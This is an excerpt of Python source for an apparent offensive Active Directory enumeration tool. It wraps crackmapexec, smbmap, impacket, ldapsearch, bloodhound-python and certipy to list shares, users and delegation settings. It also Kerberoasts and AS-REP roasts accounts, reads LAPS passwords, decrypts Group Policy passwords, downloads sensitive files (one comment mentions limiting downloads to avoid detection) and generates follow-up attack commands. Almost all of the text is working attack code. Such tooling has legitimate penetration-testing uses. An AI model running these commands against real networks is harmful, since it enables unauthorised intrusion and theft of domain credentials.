...
{Style.RESET_ALL}""")
    ...
    def enum_smb_info(self):
        ...
        if self.username:
            cmd = f"crackmapexec smb {self.target} -u '{self.username}' -p '{self.password}' 2>/dev/null"
        else:
            cmd = f"crackmapexec smb {self.target} -u '' -p '' 2>/dev/null"
        ...
        if stdout:
            ...
            if "name:" in stdout.lower():
                match = re.search(r'name:([^\)]+)', stdout.lower())
                if match:
            ...
            if "domain:" in stdout.lower():
                match = re.search(r'domain:([^\)]+)', stdout.lower())
                if match:
            ...
            if "[+]" in stdout and self.username:
        ...
        # Method 2: Quick nmap scripts
        if self.deep:
            cmd = f"nmap -p445 --script smb-os-discovery,smb-security-mode {self.target} -Pn 2>/dev/null"
    ...
    def enum_shares(self):
        """Enhanced share enumeration"""
        if 445 not in self.results['services']:
            return
        
        print(f"\n{Fore.YELLOW}[*] Enumerating shares...{Style.RESET_ALL}")
        
        # Use smbmap for detailed permissions
        if self.username:
            cmd = f"smbmap -H {self.target} -u '{self.username}' -p '{self.password}' 2>/dev/null"
        else:
            cmd = f"smbmap -H {self.target} -u 'guest' 2>/dev/null"
                    ...
                    if len(parts) >= 2:
                        ...
                        if share_name and not share_name.startswith('['):
                            ...
                            if 'WRITE' in perms:
                                ...
                                print(f"{Fore.RED}[!] WRITABLE: {share_name} - {perms}{Style.RESET_ALL}")
                            elif 'READ' in perms:
                                readable_shares.append(share_name)
                                print(f"{Fore.GREEN}[+] Readable: {share_name} - {perms}{Style.RESET_ALL}")
                            else:
                                print(f"{Fore.YELLOW}[+] Found: {share_name} - {perms}{Style.RESET_ALL}")
        
        # Try to list interesting files if we have readable shares
        if readable_shares and self.username and self.deep:
            print(f"{Fore.YELLOW}[*] Looking for interesting files...{Style.RESET_ALL}")
            for share in readable_shares[:3]:  # Check first 3 readable shares
                cmd = f"smbmap -H {self.target} -u '{self.username}' -p '{self.password}' -r '{share}' 2>/dev/null | grep -E '\\.(xml|txt|ini|conf|config|bat|ps1|vbs|bak|old)' | head -10"
                stdout, _, _ = self.run_command(cmd, timeout=15)
                if stdout:
                    print(f"{Fore.CYAN}[+] Interesting files in {share}:{Style.RESET_ALL}")
                    for line in stdout.split('\n')[:5]:
                        if line.strip():
                            print(f"    {line.strip()}")
    ...
    def enum_users(self):
        ...
        if self.username:
            cmd = f"crackmapexec smb {self.target} -u '{self.username}' -p '{self.password}' --users 2>/dev/null"
        ...
        if self.username and self.deep:
            cmd = f"rpcclient -U '{self.username}%{self.password}' {self.target} -c 'enumdomusers' 2>/dev/null"
            stdout, _, returncode = self.run_command(cmd, timeout=20)
        ...
        if 389 in self.results['services'] and not self.username:
            ...
            cmd = f"ldapsearch -x -H ldap://{self.target} -b '{domain_dn}' '(objectClass=user)' sAMAccountName 2>/dev/null | grep sAMAccountName"
            stdout, _, _ = self.run_command(cmd, timeout=20)
    ...
    def enum_groups(self):
        ...
        cmd = f"rpcclient -U '{self.username}%{self.password}' {self.target} -c 'enumdomgroups' 2>/dev/null"
        stdout, _, returncode = self.run_command(cmd, timeout=20)
    ...
    def check_password_policy(self):
        ...
        cmd = f"crackmapexec smb {self.target} -u '{self.username}' -p '{self.password}' --pass-pol 2>/dev/null"
        stdout, _, returncode = self.run_command(cmd, timeout=15)
    ...
    def check_vulnerabilities(self):
        ...
        if 445 in self.results['services']:
            cmd = f"nmap -p445 --script smb-vuln-ms17-010 {self.target} -Pn 2>/dev/null"
        ...
        if self.username and self.deep:
            cmd = f"rpcdump.py '{self.username}:{self.password}@{self.target}' 2>/dev/null | grep -E 'MS-RPRN|MS-PAR'"
            stdout, _, _ = self.run_command(cmd, timeout=20)
    ...
    def check_kerberos(self):
        ...
        cmd = f"impacket-GetUserSPNs '{domain}/{self.username}:{self.password}' -dc-ip {self.target} -request 2>/dev/null"
        stdout, _, returncode = self.run_command(cmd, timeout=30)
        ...
        if self.deep and os.path.exists(f"{self.output_dir}/users.txt"):
            cmd = f"impacket-GetNPUsers '{domain}/' -usersfile {self.output_dir}/users.txt -dc-ip {self.target} 2>/dev/null"
            stdout, _, returncode = self.run_command(cmd, timeout=30)
    ...
    def check_access(self):
        ...
        if 3389 in self.results['services']:
            cmd = f"crackmapexec rdp {self.target} -u '{self.username}' -p '{self.password}' 2>/dev/null"
            stdout, _, returncode = self.run_command(cmd, timeout=15)
...
"""
    ...
    def bloodhound_collection(self):
        ...
        cmd = f"bloodhound-python -d {self.domain} -u '{self.username}' -p '{self.password}' -c all -ns {self.target} --zip 2>/dev/null"
        stdout, stderr, returncode = self.run_command(cmd, timeout=120)
        
        if returncode == 0:
            # Move zip files to output directory
            subprocess.run(f"mv *.zip {self.output_dir}/loot/ 2>/dev/null", shell=True)
    ...
    def generate_attack_commands(self):
        ...
        if self.results['kerberos'].get('kerberoastable', 0) > 0:
            ...
            commands['linux_commands'].append(f"impacket-GetUserSPNs '{domain}/{self.username}:{self.password}' -dc-ip {self.target} -request")
        ...
        for esc in self.results['adcs']:
            if esc.startswith('ESC') and self.results['adcs'][esc]:
                ...
                commands['linux_commands'].append(f"certipy req -u '{self.username}@{self.domain}' -p '{self.password}' -target {self.target}")
...
class SMBAdvancedEnum:
    ...
    def enum_smb_recursive(self, share_name, max_depth=3):
        ...
        for category, patterns in critical_patterns.items():
            ...
            for pattern in patterns:
                ...
                cmd = f"smbmap -H {self.parent.target} -u '{self.parent.username}' -p '{self.parent.password}' -r '{share_name}' --depth {max_depth} -q '{pattern}' 2>/dev/null"
    ...
    def _download_critical_files(self, share_name, critical_files):
        ...
        for file_info in critical_files[:5]:  # Limit downloads to prevent detection
            try:
                ...
                cmd = f"smbget -q -u '{self.parent.username}%{self.parent.password}' smb://{self.parent.target}/{share_name}/{file_info['path']} -o {local_path} 2>/dev/null"
    ...
    def extract_gpp_passwords(self):
        ...
        for share in all_shares:
            ...
            cmd = f"smbmap -H {self.parent.target} -u '{self.parent.username}' -p '{self.parent.password}' -r '{share}' 2>/dev/null"
            ...
            for gpp_file in gpp_files:
                cmd = f"smbmap -H {self.parent.target} -u '{self.parent.username}' -p '{self.parent.password}' -r '{share}' --depth 5 -q '{gpp_file}' 2>/dev/null"
                ...
                if len(parts) >= 3:
                    ...
                    if filepath and filepath.endswith('.xml'):
                        try:
                            ...
                            cmd = f"smbget -q -u '{self.parent.username}%{self.parent.password}' smb://{self.parent.target}/{share}/{filepath} -o {local_path} 2>/dev/null"
    ...
    def _search_xml_for_cpassword(self):
        ...
        for share in shares_to_check:
            cmd = f"smbmap -H {self.parent.target} -u '{self.parent.username}' -p '{self.parent.password}' -r '{share}' --depth 3 -q '*.xml' 2>/dev/null"
            stdout, _, _ = self.parent.run_command(cmd, timeout=30)
    ...
    def _check_xml_for_cpassword(self, share, filepath):
        ...
        try:
            ...
            cmd = f"smbclient -U '{self.parent.username}%{self.parent.password}' //{self.parent.target}/{share} -c 'more \"{filepath}\"' 2>/dev/null | head -20"
            stdout, _, returncode = self.parent.run_command(cmd, timeout=15)
    ...
    def _decrypt_gpp_password(self, cpassword):
        ...
        try:
            ...
            try:
                ...
                cmd = f"echo '{cpassword}' | gpp-decrypt 2>/dev/null"
...
class LDAPAdvancedEnum:
    ...
    def enum_delegation(self):
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' sAMAccountName dNSHostName userAccountControl 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo dNSHostName objectClass 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity dNSHostName 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
    ...
    def enum_acls(self):
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(&(objectClass=user)(adminCount=1))' sAMAccountName adminCount 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(objectClass=user)' sAMAccountName memberOf 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' sAMAccountName dNSHostName 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(objectClass=computer)' sAMAccountName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
    ...
    def enum_laps(self):
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(objectClass=computer)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
...
class KerberosAdvanced:
    ...
    def targeted_kerberoast(self):
        ...
        cmd = f"impacket-GetUserSPNs '{domain}/{self.parent.username}:{self.parent.password}' -dc-ip {self.parent.target} -outputfile {self.parent.output_dir}/loot/kerberoast_detailed.txt 2>/dev/null"
    ...
    def asreproast_enhanced(self):
        ...
        cmd = f"impacket-GetNPUsers '{domain}/' -no-preauth -dc-ip {self.parent.target} -outputfile {self.parent.output_dir}/loot/asrep_computers.txt 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
...
class ADCSEnum:
    ...
    def enum_cert_templates(self):
        ...
        cmd = f"certipy find -u '{self.parent.username}@{self.parent.domain}' -p '{self.parent.password}' -target {self.parent.target} -text -stdout 2>/dev/null"
        stdout, _, returncode = self.parent.run_command(cmd, timeout=60)
    ...
    def enum_ca_config(self):
        ...
        for port in web_ports:
            if self.parent.check_port(port):
                cmd = f"curl -k -s https://{self.parent.target}/certsrv/ 2>/dev/null | grep -i 'certificate'"
...
class CoercionEnum:
    ...
    def enum_coercion_methods(self):
        ...
        for method, tool in coercion_methods.items():
            ...
            cmd = f"rpcdump.py '{self.parent.username}:{self.parent.password}@{self.parent.target}' 2>/dev/null | grep -E 'MS-RPRN|MS-EFSRPC|MS-DFSNM|MS-FSRVP'"
    ...
    def check_signing_requirements(self):
        ...
        if 389 in self.parent.results['services']:
            cmd = f"nmap -p389 --script ldap-rootdse {self.parent.target} -Pn 2>/dev/null"
            stdout, _, _ = self.parent.run_command(cmd, timeout=15)
...
class PrivEscEnum:
    ...
    def enum_machine_quota(self):
        ...
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D '{self.parent.username}@{self.parent.domain}' -w '{self.parent.password}' -b '{domain_dn}' '(objectClass=domain)' ms-DS-MachineAccountQuota 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=15)
    ...
    def enum_gpo_abuse(self):
        ...
        cmd = f"crackmapexec smb {self.parent.target} -u '{self.parent.username}' -p '{self.parent.password}' --groups 2>/dev/null"
        stdout, _, _ = self.parent.run_command(cmd, timeout=15)
        ...
        for cred in self.discovered_creds:
            if cred['password']:  # Skip hash-only entries for now
                ...
                if 445 in self.parent.results['services']:
                    cmd = f"crackmapexec smb {self.parent.target} -u '{cred['username']}' -p '{cred['password']}' 2>/dev/null"
